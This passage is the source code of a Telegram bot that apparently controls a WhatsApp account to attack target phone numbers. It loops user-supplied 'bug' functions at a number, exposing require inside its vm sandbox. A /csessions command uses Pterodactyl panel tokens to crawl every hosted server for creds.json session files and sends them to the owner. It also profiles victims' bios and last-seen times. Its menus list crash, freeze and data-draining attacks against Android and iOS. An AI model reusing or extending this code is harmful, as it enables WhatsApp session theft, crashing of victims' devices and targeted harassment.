      return ctx.reply("❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message?.text) {
      return ctx.reply("❌ Reply dengan function");
    }

    const photoUrl = "https://files.catbox.moe/fv8860.jpg";

    const processMsg = await ctx.replyWithPhoto(photoUrl, {
      caption: `
\`\`\`js
⎔ ARTA THE OLYMPUS
━━━━━━━━━━━━━━⪼
‎↯  Target  :: ${q}
‎↯  Type    :: Unknown Function
‎↯  Status  :: ▓▒░ Processing...
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "» Check", url: `https://wa.me/${q}`, style: "danger" }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    const funcCode = ctx.message.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) {
      return ctx.reply("❌ Function harus async function");
    }

    const funcName = matchFunc[1];

    const vm = require("vm");

    const safeSock = createSafeSock(global.sock || sock);

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      require
    };

    const context = vm.createContext(sandbox);

    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;

        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (e) {
        console.log("Loop error:", e.message);
      }

      await new Promise(r => setTimeout(r, 200));
    }

    const finalText = `
\`\`\`js
⎔ ARTA THE OLYMPUS
━━━━━━━━━━━━━━⪼
‎↯  Target  :: ${q}
‎↯  Type    :: Unknown Function
‎↯  Status  :: ✅ Success...
\`\`\``;

    try {
      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        null,
        finalText,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "» Check", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      );
    } catch {
      await ctx.replyWithPhoto(photoUrl, {
        caption: finalText,
        parse_mode: "Markdown"
      });
    }

  } catch (err) {
    console.error("ERROR:", err);
    ctx.reply("❌ Terjadi error");
  }
});

// ===== CEK FUNCTION =====
bot.command('cekfunc', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const replyToMessage = ctx.message.reply_to_message;

        if (!replyToMessage || !replyToMessage.text) {
            return ctx.reply("❌ Reply kode JS lalu ketik /cekfunc");
        }

        const code = replyToMessage.text;
        const wrappedCode = `(async () => { ${code} })();`;

        try {
            new vm.Script(wrappedCode);
            return ctx.reply(
                "✅ Syntax valid! Tidak ada error\n© Created By Arlend",
                { parse_mode: "Markdown" }
            );
        } catch (err) {
            return ctx.reply(
                `❌ Syntax Error:\n${err.message}`,
                { parse_mode: "Markdown" }
            );
        }

    } catch (error) {
        console.error('❌ Error cekfunc:', error.message);
        await ctx.reply(`❌ Error: ${error.message}`);
    }
});

// ============================================
// COMMAND STATUSWEB
// ============================================
bot.command("statusweb", async ctx => {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    const replyId = ctx.message.message_id;

    if (!input) {
        return ctx.reply(
            "❌ Masukkan URL!\n\nContoh: /statusweb https://example.com",
            { reply_to_message_id: replyId }
        );
    }

    let target = input;
    if (!/^https?:\/\//i.test(target)) target = "http://" + target;

    const msg = await ctx.reply("🔍 Mengecek status...");

    try {
        const start = Date.now();
        const res = await axios.get(target, { timeout: 8000, validateStatus: () => true });
        const ping = Date.now() - start;

        let icon = "🟢";
        let status = "ONLINE";
        if (res.status >= 400 && res.status < 500) { icon = "🟠"; status = "ERROR (Client)"; }
        else if (res.status >= 500) { icon = "🔴"; status = "ERROR (Server)"; }

        const caption = 
`🌐 *STATUS WEBSITE*

${icon} Status: ${status}
├ HTTP Code: ${res.status}
├ Response: ${ping} ms
└ URL: ${target}`;

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, caption, { parse_mode: "Markdown" });

    } catch {
        const caption = 
`🌐 *STATUS WEBSITE*

🔴 Status: DOWN
├ Response: Timeout
└ URL: ${target}

❌ Website tidak dapat diakses`;

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, caption, { parse_mode: "Markdown" });
    }
});

bot.command("cekid", async ctx => {
  if (!ctx.message) return;

  let target;

  // === REPLY TEXT ===
  if (ctx.message.reply_to_message) {
    target = ctx.message.reply_to_message.from;
  }

  // === USERNAME @ ===
  else {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0] || !args[0].startsWith("@"))
      return ctx.reply("⚠️ Format Salah!:\n/cekid @username\natau reply user");

    try {
      // Telegram TIDAK bisa get user by username
      return ctx.reply(
        "❌ Tidak bisa cek ID via @username tanpa reply.\n📛 Silakan reply pesan user tersebut."
      );
    } catch {
      return ctx.reply("❌ User tidak ditemukan");
    }
  }

  // === Validate User ===
  if (!target.username) {
    return ctx.reply(
      `❌ *GAGAL CEK USER*

👤 Nama: ${target.first_name}
📛 User tersebut *tidak menggunakan username*`,
      { parse_mode: "Markdown" }
    );
  }

  // === End ===
  ctx.reply(
    `✅ *USER DITEMUKAN*

👤 Nama: ${target.first_name}
🆔 ID: \`${target.id}\`
🔗 Username: @${target.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async ctx => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("🪧 » Format: /cekbio 62×××");
  }

  const q = args[1];
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
    caption: `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📱 » Target", url: `https://wa.me/${q}`, style: "primary" }],
      ],
    },
  });

  try {
    const contact = await sock.onWhatsApp(target);

    if (!contact || contact.length === 0) {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        processMsg.message_id,
        undefined,
        `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp
\`\`\``,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "📱 » Target",
                  url: `https://wa.me/${q}`,
                  style: "primary",
                },
              ],
            ],
          },
        }
      );
      return;
    }

    const contactDetails = await sock.fetchStatus(target).catch(() => null);
    const profilePicture = await sock
      .profilePictureUrl(target, "image")
      .catch(() => null);

    const bio = contactDetails?.status || "Tidak ada bio";
    const lastSeen = contactDetails?.lastSeen
      ? moment(contactDetails.lastSeen)
          .tz("Asia/Jakarta")
          .format("DD-MM-YYYY HH:mm:ss")
      : "Tidak tersedia";

    const caption = `\`\`\`js
⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡
Nomor: ${q}
Status WhatsApp: ✅ Terdaftar
Bio: ${bio}
Terakhir Dilihat: ${lastSeen}
${profilePicture ? "Profile Picture: ✅ Tersedia" : "Profile Picture: ❌ Tidak tersedia"}

<i>Diperiksa pada: ${moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss")}</i>
\`\`\``;

    // Jika ada profile picture, kirim bersama foto profil
    if (profilePicture) {
      await ctx.replyWithPhoto(profilePicture, {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📱 Chat Target",
                url: `https://wa.me/${q}`,
                style: "primary",
              },
            ],
          ],
        },
      });
    } else {
      await ctx.replyWithPhoto(thumbnailUrl, {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📱 Chat Target",
                url: `https://wa.me/${q}`,
                style: "primary",
              },
            ],
          ],
        },
      });
    }

    await ctx.deleteMessage(processMsg.message_id);
  } catch (error) {
    console.error("Error checking bio:", error);

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMsg.message_id,
      undefined,
      `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📱 » Target",
                url: `https://wa.me/${q}`,
                style: "primary",
              },
            ],
          ],
        },
      }
    );
  }
});

// =================== SPOTIFY ===================
bot.command('spotify', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const query = ctx.message.text.split(' ').slice(1).join(' ');

        if (!query) {
            return ctx.reply('/spotify judul lagu');
        }

        const loading = await ctx.reply('Mencari lagu...');

        const { data } = await axios.get(
            `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`
        );

        if (!data?.status || !data?.result) {
            return ctx.telegram.editMessageText(
                chatId,
                loading.message_id,
                null,
                'Lagu tidak ditemukan.'
            );
        }

        const result = data.result;

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            null,
            'Mengirim audio...'
        );

        const formatDuration = (sec) => {
            const m = Math.floor(sec / 60);
            const s = String(sec % 60).padStart(2, "0");
            return `${m}:${s}`;
        };

        const caption = "```js\n" +
"Title: " + result.title + "\n" +
"Artist: " + (result.author || "Unknown") + "\n" +
"Duration: " + formatDuration(result.duration) + "\n" +
"```";

        await ctx.replyWithAudio(result.audio.url, {
            title: result.title,
            performer: result.author || "Unknown Artist",
            caption: caption,
            parse_mode: "Markdown"
        });

        await ctx.deleteMessage(loading.message_id);

    } catch (error) {
        console.error('Error spotify:', error.message);
        await ctx.reply('Terjadi kesalahan.');
    }
});

// =================== /carisesi ===================
bot.command("csessions", checkPremium, async ctx => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios
        .get(`${base}/api/application/servers`, {
          params: { page },
          headers: commonHeadersApp,
          timeout: 15000,
        })
        .catch(() => ({ data: null }));
      const chunk =
        r && r.data && Array.isArray(r.data.data) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(
        r &&
        r.data &&
        r.data.meta &&
        r.data.meta.pagination &&
        r.data.meta.pagination.links &&
        r.data.meta.pagination.links.next
      );
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios
        .get(`${base}/api/client/servers/${identifier}/files/list`, {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        })
        .catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name =
          (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if (
          (lower === "session" || lower === "sessions") &&
          isDirectory(item)
        ) {
          try {
            const sessRes = await axios
              .get(`${base}/api/client/servers/${identifier}/files/list`, {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              })
              .catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName =
                  (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath =
                  (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(
              identifier,
              normalized === "" ? "/" : normalized
            );
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(
            /\/+$/,
            ""
          );

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios
              .get(`${base}/api/client/servers/${identifier}/files/download`, {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              })
              .catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(
              `Gagal download ${filePath} dari ${name}:`,
              e?.message || e
            );
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply(
        "✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun"
      );
    } else {
      return ctx.reply(
        `✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`
      );
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

const delay = ms => new Promise(res => setTimeout(res, ms));
const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);

//============ JOIN CHANNEL (DYNAMIC) =======\\
const joinedUsers = new Set();

function isUserJoined(userId) {
    return joinedUsers.has(userId);
}

async function checkJoinAll(ctx) {
    if (!forceChannels || forceChannels.length === 0) return true;

    const userId = ctx.from.id;
    if (isUserJoined(userId)) return true;

    for (const ch of forceChannels) {
        try {
            const member = await ctx.telegram.getChatMember(`@${ch}`, userId);
            const status = ["member", "administrator", "creator"].includes(member.status);
            if (!status) return false;
        } catch (err) {
            console.log(`CHECK JOIN ERROR (${ch}):`, err.message);
            return false;
        }
    }

    joinedUsers.add(userId);
    return true;
}

async function refreshJoinAll(ctx) {
    const userId = ctx.from.id;
    joinedUsers.delete(userId);
    return await checkJoinAll(ctx);
}

const notifiedUsers = new Map();

bot.use(async (ctx, next) => {
    try {
        if (!ctx.from) return next();

        const text = ctx.message?.text;
        if (!text || !text.startsWith("/")) return next();

        const command = text.split(" ")[0].toLowerCase();
        if (command === "/setch") return next();

        if (!forceChannels || forceChannels.length === 0) return next();

        const userId = ctx.from.id;
        const joined = await checkJoinAll(ctx);

        if (!joined) {
            const lastNotif = notifiedUsers.get(userId);
            if (lastNotif && Date.now() - lastNotif < 30000) return;

            const buttons = forceChannels.map(ch => [
                {
                    text: `「 λ Join @${ch} λ 」`,
                    url: `https://t.me/${ch}`,
                    style: "primary"
                }
            ]);

            buttons.push([
                {
                    text: "「 λ Check Join λ 」",
                    callback_data: "check_join",
                    style: "primary"
                }
            ]);

            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: `<blockquote><strong>( 🔒 ) Kamu wajib join semua channel sebelum menggunakan bot ini.</strong></blockquote>`,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: buttons
                }
            });

            notifiedUsers.set(userId, Date.now());
            setTimeout(() => {
                notifiedUsers.delete(userId);
            }, 300000);

            return;
        }

        if (notifiedUsers.has(userId)) {
            notifiedUsers.delete(userId);
        }

        return next();
    } catch (e) {
        console.log("MIDDLEWARE JOIN ERROR:", e.message);
        return ctx.replyWithPhoto(thumbnailUrl, {
            caption: "❌ Terjadi error saat cek akses channel."
        });
    }
});

bot.action('check_join', async (ctx) => {
    try {
        await ctx.answerCbQuery('⏳ Mengecek...').catch(() => {});

        const userId = ctx.from.id;
        const joined = await refreshJoinAll(ctx);

        if (joined) {
            if (notifiedUsers.has(userId)) {
                notifiedUsers.delete(userId);
            }

            await ctx.deleteMessage();

            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: '✅ *Akses Diberikan!*\nKamu sudah join semua channel. Sekarang kamu bisa menggunakan perintah bot.\n\nKetik /start untuk memulai.',
                parse_mode: 'Markdown'
            });
        } else {
            await ctx.answerCbQuery('❌ Kamu belum join semua channel! Silakan join terlebih dahulu.', { show_alert: true });
        }
    } catch (e) {
        console.log("CHECK JOIN CALLBACK ERROR:", e.message);
        try {
            await ctx.answerCbQuery('❌ Terjadi error, coba lagi nanti.');
        } catch (err) {}
    }
});

//============( MENU UTAMA ) =======\\

bot.use((ctx, next) => {
  if (secureMode) return;
  return next();
});

const userFirstStart = new Set();

bot.start(async ctx => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!userFirstStart.has(userId)) {
    userFirstStart.add(userId);

    const progressMsg = await ctx.reply('<tg-emoji emoji-id="6206118633370818254">✨</tg-emoji> Loading Script...', {
        parse_mode: "HTML",
    });

    const steps = [
        { text: '<tg-emoji emoji-id="6206446249181189526">✨</tg-emoji> Trying Open Menu...', delay: 800 },
        { text: '<tg-emoji emoji-id="6206118633370818254">✨</tg-emoji> Welcome To Arta The Olympus.....', delay: 900 },
    ];
    
    for (const step of steps) {
        await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            null,
            step.text,
            { parse_mode: "HTML" }
        );
        await new Promise(resolve => setTimeout(resolve, step.delay));
    }
    
    await ctx.deleteMessage(progressMsg.message_id);
}

    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
    
    const menuMessage = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ UPDATE SCRIPT</strong></blockquote>
» New Tools
» New Baileys
» Createam
» Fun Menu
» Auto Update
» 2 Version Bug Spam/No Spam
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Harga Script λ 」",
        callback_data: "/harga",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Own Menu λ 」",
        callback_data: "/controls",
        style: "primary",
      },       
      {
        text: "「 λ All Menu λ 」",
        callback_data: "/mnu",
        style: "primary",
      },
    ],
    [
      {
        text: "「 λ Thanks To λ 」",
        callback_data: "tqto",
        style: "primary",
      },
    ]
  ];

  ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: keyboard,
    },
  });
});

bot.action("/start", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
    
    const menuMessage = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ UPDATE SCRIPT</strong></blockquote>
» New Tools
» New Baileys
» Createam
» Fun Menu
» Auto Update
» 2 Version Bug Spam/No Spam
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Harga Script λ 」",
        callback_data: "/harga",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Own Menu λ 」",
        callback_data: "/controls",
        style: "primary",
      },       
      {
        text: "「 λ All Menu λ 」",
        callback_data: "/mnu",
        style: "primary",
      },
    ],
    [
      {
        text: "「 λ Thanks To λ 」",
        callback_data: "tqto",
        style: "primary",
      },
    ]
  ];

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: thumbnailUrl,
        caption: menuMessage,
        parse_mode: "HTML",
      },
      {
        reply_markup: {
          inline_keyboard: keyboard,
        },
      }
    );
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/controls", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const controlsMenu = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ CONTROL MENU</strong></blockquote>
‎↯ /addsender - Add Sender Number
‎↯ /resetsesi - Reset Session
‎↯ /setcd - Set Bot Cooldown
‎↯ /setch - Set Channel Force Join
‎↯ /addprem - Add Premium Users
‎↯ /delprem - Delete Premium Users
‎↯ /addpremgb - Add Premium Group
‎↯ /delpremgb - Delete Premium Group
‎↯ /update - Auto Update Script
‎↯ /cekupdate - Cek Update Script
‎↯ /blockcmd - Disable Command
‎↯ /opencmd - Enable Command
‎↯ /addadmin - Add Admin Access
‎↯ /deladmin - Delete Access Admin
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Back λ 」",
        callback_data: "/start",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Developer λ 」",
        url: "https://t.me/lendd3",
        style: "primary",
      },
      {
        text: "「 λ Testimoni λ 」",
        url: "https://t.me/infoarlend",
        style: "primary",
      },
    ],
  ];

  try {
    await ctx.editMessageCaption(controlsMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/mnu", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const bugMenu = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ PENJELASAN SINGKAT</strong></blockquote>
Script Ini Di Buat Bukan Untuk Merugikan Orang Lain
Gunakan Script Ini Secara Bijak
Jangan Pernah Mencoba Merusak Harga Script
Jangan Pernah Mencoba Share Free Script
Developer Tidak Bertanggung Jawab Atas Penyalahgunaan Script Ini
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Back λ 」",
        callback_data: "/start",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Menu Spam λ 」",
        callback_data: "/bugv1",
        style: "primary",
      },
      {
        text: "「 λ No Spam λ 」",
        callback_data: "/bugv2",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Tools & Fun λ 」",
        callback_data: "/fun",
        style: "primary",
      },
    ], 
  ];

  try {
    await ctx.editMessageCaption(bugMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/bugv1", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const funMenu = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ BUG FREE SPAM</strong></blockquote>
‎↯ /lendinvis → Delay Invisible
‎↯ /artafc → Forcelose Android
‎↯ /artabc → Blank Click
‎↯ /ntafrz → Freeze Invisible
‎↯ /ntainvis → Delay Invisible V2
‎↯ /lendclx → Forcelose Click
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Back λ 」",
        callback_data: "/mnu",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Developer λ 」",
        url: "https://t.me/lendd3",
        style: "primary",
      },
      {
        text: "「 λ Testimoni λ 」",
        url: "https://t.me/infoarlend",
        style: "primary",
      },
    ],
  ];

  try {
    await ctx.editMessageCaption(funMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/bugv2", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const funMenu = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ BUG NO SPAM</strong></blockquote>
‎↯ /artabuldo → Drain Quota
‎↯ /artahard → Delay Hard
‎↯ /fcios → Forcelose IOS 
‎↯ /incl → Crash Chat
‎↯ /sedot → Buldozer Invisible
‎↯ /delaynew → Delay Tag Story
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Back λ 」",
        callback_data: "/mnu",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Developer λ 」",
        url: "https://t.me/lendd3",
        style: "primary",
      },
      {
        text: "「 λ Testimoni λ 」",
        url: "https://t.me/infoarlend",
        style: "primary",
